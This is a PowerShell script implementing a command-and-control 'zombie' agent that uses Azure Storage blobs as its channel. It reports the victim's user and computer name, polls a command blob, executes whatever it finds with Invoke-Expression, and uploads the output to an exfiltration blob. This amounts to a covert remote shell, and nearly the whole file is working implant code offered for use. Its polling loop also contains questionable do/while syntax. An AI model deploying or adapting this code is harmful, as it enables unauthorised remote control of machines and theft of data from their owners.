function Connect-AzureStorageC2Zombie {
    <#
.SYNOPSIS
    Receive commands from a remote host using Azure Storage.
  .DESCRIPTION
    'Connect-AzureStorageC2Zombie' Grabs the command found in the 'CommandBlob',
    executes that command and returns output to the 'ExfilBlob'
  .PARAMETER StorageAccountName
    Name of the Storage Account we will use to post commands and receive command output.
  .PARAMETER SasToken
    Shared Access Signature (SAS) used for AuthZ/AuthA
    The 'SasToken' parameter in not needed if the Storage Acount allows anonymous access.
  .PARAMETER Container
    The Container name that will hold our 'ExfilBlob' and 'CommandBlob'
  .PARAMETER ExfilBlob
    Blob that stores command output.
  .PARAMETER CommandBlob
    Blob that stores command to be executed.
  .PARAMETER BaseUri
    Azure endpoint that hosts the Storage Account. 'BaseUri' must be one of:
    ".blob.core.windows.net"
    ".blob.core.chinacloudapi.cn"
    ".blob.core.cloudapi.de"
    ".blob.core.usgovcloudapi.net"
  .PARAMETER Sleep
    Ammount of time 'Connect-AzureStorageC2Zombie' should wait before checking for command output.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$StorageAccountname,

        [Parameter(Mandatory=$true)]
        [string]$Container,

        [Parameter(Mandatory=$true)]
        [string]$ExfilBlob,

        [Parameter(Mandatory=$true)]
        [string]$CommandBlob,

        [Parameter()]
        [ValidateSet(".blob.core.windows.net",".blob.core.chinacloudapi.cn",".blob.core.cloudapi.de",".blob.core.usgovcloudapi.net")]
        [string]$baseUri = ".blob.core.windows.net",

        [Parameter(Mandatory=$true)]
        [string]$SasToken,

        [Parameter()]
        [int]$Sleep = 200
    )

    function New-RFC1123DateUTC {
        $localTime = Get-Date
        $utcTime = $localTime.ToUniversalTime()
        foreach ($format in $utcTime.GetDateTimeFormats()){
            if($format -match "^\w{3},\s\d{2}\s\w{3}\s\d{4}\s\d{2}:\d{2}:\d{2}\sGMT$"){
                $format
                break
            }
        }
    }
    function New-AzureStorageApiHeader {
        param(
            [parameter(Mandatory=$true)]
            [string]$date
        )
        $guid = (New-Guid).Guid
        @{"x-ms-date"=$date;"x-ms-version"="2018-03-28";"x-ms-client-request-id"=$guid}
    }
    function Receive-AzureStorageBlobMetadata{ # Compare the 'last-modified' find out if command have been updated.
        $operation = "?comp=metadata"
        $header = New-AzureStorageApiHeader -date (New-RFC1123DateUTC)
        $response = Invoke-WebRequest -Method Head -Headers $header -uri "${uri}${Container}/${CommandBlob}${operation}$($SasToken.Replace("?","&"))"
        $response.Headers
    }
    function Receive-Command{ #Invoke-WebRequest -Headers $header -Uri "$uri/$CommandBlob$sastoken"
        $header = New-AzureStorageApiHeader -date (New-RFC1123DateUTC)
        Invoke-RestMethod -Method Get -Headers $header -uri "${uri}${Container}/${CommandBlob}${SasToken}"
    }
    function Send-Output {
        param(
            [parameter()]
            [string]$CommandOutput #= "this is output"
        )
        $header = New-AzureStorageApiHeader -date (New-RFC1123DateUTC)
        $header.Add('x-ms-blob-type','BlockBlob')
        $response = Invoke-WebRequest -Method Put -Headers $header -uri "${uri}${Container}/${ExfilBlob}${SasToken}" -Body $CommandOutput
        $response.StatusCode | Out-Null
    }

    function invoke-command{
        param(
            [parameter()]
            [string]$cmds
        )
        foreach ($cmd in $cmds.Split("`n")){
            if ($cmd -ne '') {
                Invoke-Expression ($cmd)
            }
        }
    }
    # Global variables
    $uri = "https://${Storageaccountname}${baseUri}/"
    Send-Output -CommandOutput "PS $env:USERNAME@$env:COMPUTERNAME>"
    Write-Verbose "Sending command prompt"

    $command = Receive-Command
    $currentCmdTimeStamp = (Receive-AzureStorageBlobMetadata).'last-modified'
   # Write-Verbose "Command Received"

    while ($command -notlike "exit") {
        if ($command.Length -gt 0) {
            $cmdOutput = invoke-command -cmds $command
                #Write-Verbose "Command executed."
            Send-Output -CommandOutput ($cmdOutput | Out-String)
                #Write-Verbose "Command output sent."
        }
        do{
            $checkForNewCommand = (Receive-AzureStorageBlobMetadata).'last-modified'
        }
        while ($currentCmdTimeStamp -ge  $checkForNewCommand ) {
            Start-Sleep $Sleep
            $checkForNewCommand = (Receive-AzureStorageBlobMetadata).'last-modified'
        } | Out-Null
        #Write-Verbose "Out of sleep."
        $command = Receive-Command
        $currentCmdTimeStamp = (Receive-AzureStorageBlobMetadata).'last-modified'
           # Write-Verbose "Commands where last updated at: $currentCmdTimeStamp"
            #Write-Verbose "Command Received"
    }
}